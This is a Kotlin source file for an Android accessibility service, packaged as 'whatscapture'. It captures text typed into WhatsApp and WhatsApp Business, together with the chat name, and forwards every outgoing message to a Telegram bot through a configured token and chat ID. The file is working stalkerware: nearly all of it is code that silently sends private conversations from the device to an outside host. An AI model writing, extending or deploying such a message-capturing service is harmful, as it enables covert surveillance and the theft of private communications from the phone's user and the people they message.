package com.whatscapture

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class WhatsAppAccessibilityService : AccessibilityService() {

    private var lastDraftText: String = ""
    private var lastDraftAt: Long = 0L
    private var lastSentSignature: String = ""
    private var lastSentAt: Long = 0L
    private var lastComposerText: String = ""

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility service conectado")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            event ?: return
            val pkg = event.packageName?.toString() ?: return
            if (pkg != WHATSAPP_PACKAGE && pkg != WHATSAPP_BUSINESS_PACKAGE) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
                AccessibilityEvent.TYPE_VIEW_CLICKED -> handleViewClicked(event, pkg)
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleWindowContentChanged(pkg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando evento de accesibilidad", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrumpido por el sistema")
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val value = event.text
            ?.joinToString(" ")
            ?.trim()
            .orEmpty()
        val previous = lastComposerText
        lastComposerText = value

        if (value.isEmpty()) {
            if (previous.isNotBlank()) {
                lastDraftText = previous
                lastDraftAt = System.currentTimeMillis()
            }
            return
        }

        lastDraftText = value
        lastDraftAt = System.currentTimeMillis()
    }

    private fun handleViewClicked(event: AccessibilityEvent, pkg: String) {
        val source = event.source
        if (!isSendAction(event, source) && recentDraft().isBlank()) return

        val chatName = findChatName(rootInActiveWindow).ifBlank { "Chat" }
        val outgoingText = findComposerText(rootInActiveWindow)
            .ifBlank { recentDraft() }
            .trim()
        if (outgoingText.isBlank()) return

        emitOutgoingText(pkg = pkg, chatName = chatName, outgoingText = outgoingText)
    }

    private fun handleWindowContentChanged(pkg: String) {
        val composerText = findComposerText(rootInActiveWindow).trim()
        if (composerText.isNotEmpty()) {
            lastComposerText = composerText
            lastDraftText = composerText
            lastDraftAt = System.currentTimeMillis()
            return
        }

        val recentlyClearedDraft = if (lastComposerText.isNotBlank()) lastComposerText else ""
        if (composerText.isEmpty() && recentlyClearedDraft.length >= 2) {
            lastDraftText = recentlyClearedDraft
            lastDraftAt = System.currentTimeMillis()
            lastComposerText = ""
        }

        val draft = recentDraft()
        if (draft.isBlank()) {
            return
        }

        val chatName = findChatName(rootInActiveWindow).ifBlank { "Chat" }
        emitOutgoingText(pkg = pkg, chatName = chatName, outgoingText = draft)
    }

    private fun emitOutgoingText(pkg: String, chatName: String, outgoingText: String) {
        val now = System.currentTimeMillis()
        val signature = "${pkg}|${chatName}|${outgoingText.lowercase()}"
        if (signature == lastSentSignature && now - lastSentAt < 4000L) {
            return
        }

        lastSentSignature = signature
        lastSentAt = now

        val finalMsg = """
            📤 *WhatsApp - $chatName*
            Tu: $outgoingText
        """.trimIndent()

        CoroutineScope(Dispatchers.IO).launch {
            TelegramSender.sendMessage(
                token = Config.getToken(this@WhatsAppAccessibilityService),
                chatId = Config.getChatId(this@WhatsAppAccessibilityService),
                text = finalMsg
            )
        }
    }

    private fun isSendAction(event: AccessibilityEvent, source: AccessibilityNodeInfo?): Boolean {
        val fromDescription = buildString {
            append(event.contentDescription?.toString().orEmpty())
            append(" ")
            append(source?.contentDescription?.toString().orEmpty())
            append(" ")
            append(source?.text?.toString().orEmpty())
        }.lowercase()

        val fromViewId = source?.viewIdResourceName?.lowercase().orEmpty()

        if (SEND_HINTS.any { fromDescription.contains(it) }) return true
        if (fromViewId.contains("send")) return true

        val className = source?.className?.toString()?.lowercase().orEmpty()
        if (className.contains("imagebutton") && fromDescription.isNotBlank()) return true

        return className.contains("button") && recentDraft().isNotBlank()
    }

    private fun findComposerText(root: AccessibilityNodeInfo?): String {
        root ?: return ""

        val byKnownId = try {
            COMPOSER_VIEW_IDS.asSequence()
                .mapNotNull { id -> root.findAccessibilityNodeInfosByViewId(id).firstOrNull()?.text?.toString() }
                .map { it.trim() }
                .firstOrNull { it.isNotEmpty() }
        } catch (_: Exception) {
            null
        }
        if (!byKnownId.isNullOrEmpty()) return byKnownId

        return findFirstEditableText(root).trim()
    }

    private fun findChatName(root: AccessibilityNodeInfo?): String {
        root ?: return ""

        val byKnownId = try {
            CHAT_TITLE_VIEW_IDS.asSequence()
                .mapNotNull { id -> root.findAccessibilityNodeInfosByViewId(id).firstOrNull()?.text?.toString() }
                .map { it.trim() }
                .firstOrNull { it.isNotEmpty() }
        } catch (_: Exception) {
            null
        }
        if (!byKnownId.isNullOrEmpty()) return byKnownId

        return ""
    }

    private fun findFirstEditableText(node: AccessibilityNodeInfo): String {
        val text = node.text?.toString()?.trim().orEmpty()
        if (node.isEditable && text.isNotEmpty()) {
            return text
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val value = findFirstEditableText(child)
            if (value.isNotEmpty()) return value
        }

        return ""
    }

    private fun recentDraft(): String {
        val elapsed = System.currentTimeMillis() - lastDraftAt
        return if (elapsed <= 7000L) lastDraftText else ""
    }

    companion object {
        private const val TAG = "WAAccessibility"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"

        private val SEND_HINTS = listOf("send", "enviar")

        private val COMPOSER_VIEW_IDS = listOf(
            "com.whatsapp:id/entry",
            "com.whatsapp.w4b:id/entry"
        )

        private val CHAT_TITLE_VIEW_IDS = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "com.whatsapp.w4b:id/conversation_contact_name",
            "com.whatsapp:id/title",
            "com.whatsapp.w4b:id/title"
        )
    }
}
